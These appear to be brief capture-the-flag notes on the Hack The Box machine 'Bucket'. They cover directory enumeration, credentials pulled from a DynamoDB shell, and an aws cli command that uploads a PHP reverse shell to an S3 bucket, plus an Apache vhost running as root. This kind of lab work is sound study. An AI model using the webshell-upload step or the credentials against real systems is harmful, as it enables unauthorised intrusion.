# HTB - Bucket

## `bucket.htb`
- Apache/2.4.41 (Ubuntu) Server at bucket.htb Port 80
  - Ubuntu 20.04 LTS (Focal)
- `Linux bucket 5.4.0-48-generic #52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux`

## `s3.bucket.htb`

### dirb
```
START_TIME: Sat Mar 13 00:39:58 2021
URL_BASE: http://s3.bucket.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
- http://s3.bucket.htb/health (CODE:200|SIZE:54)
- http://s3.bucket.htb/server-status (CODE:403|SIZE:278)
- http://s3.bucket.htb/shell (CODE:200|SIZE:0)
```

### `s3.bucket.htb/health`
```
{
  "services": {
    "s3": "running",
    "dynamodb": "running"
  }
}
```

### `s3.bucket.htb/shell/`
- [AWS SDK for Javascript Documentation: DynamoDB](https://docs.aws.amazon.com/AWSJavaScriptSDK/latest/AWS/DynamoDB.html)
- Accounts
  - Mgmt => `Management@#1@#`
  - Cloudadm => `Welcome123!`
  - Sysadm => `n2vM-<_K_Q:.Aa2`
- commands
  - `aws --endpoint-url http://s3.bucket.htb s3 cp revshell.php s3://adserver/revshell.php`

### local
- `roy:n2vM-<_K_Q:.Aa2`

#### `/var/www/bucket-app` and `/etc/apache2/sites-enabled`

```
<VirtualHost 127.0.0.1:8000>
  <IfModule mpm_itk_module>
    AssignUserId root root
  </IfModule>
  DocumentRoot /var/www/bucket-app
</VirtualHost>
```
